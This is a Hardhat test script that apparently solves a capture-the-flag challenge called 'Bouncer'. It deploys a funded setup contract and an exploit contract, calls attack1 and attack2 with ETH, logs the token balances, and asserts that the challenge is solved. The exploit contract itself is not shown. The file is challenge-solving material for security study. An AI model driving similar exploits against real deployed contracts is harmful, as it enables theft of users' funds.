const { expect } = require("chai");
const { ethers } = require('hardhat');

describe("Bouncer", function() {
    let attacker;
    it("should return the solved", async function() {
        [attacker] = await ethers.getSigners();

        const Setup = await ethers.getContractFactory("bouncerSetup",attacker);
        const setup = await Setup.deploy({
            value: ethers.utils.parseEther("100.0")
        });

        const bouncerAddr = await setup.bouncer();
        const bouncer = await ethers.getContractAt("Bouncer", bouncerAddr, attacker);

        console.log(await setup.bal())

        const Exploit = await ethers.getContractFactory("bouncerExploit",attacker);
        const exploit = await Exploit.deploy();

        await exploit.attack1(bouncer.address,{
            value: ethers.utils.parseEther("1.0")
        })

        console.log("bouncer.tokens(exploit.address,ETH)",await bouncer.tokens(exploit.address,"0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"))

        console.log(await setup.bal())

        await exploit.attack2({
            value: ethers.utils.parseEther("53.0")
        })

        console.log("bouncer.tokens(exploit.address,ETH)",await bouncer.tokens(exploit.address,"0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"))
        console.log(await setup.bal())


        expect(await setup.isSolved()).to.equal(true)

    })
})
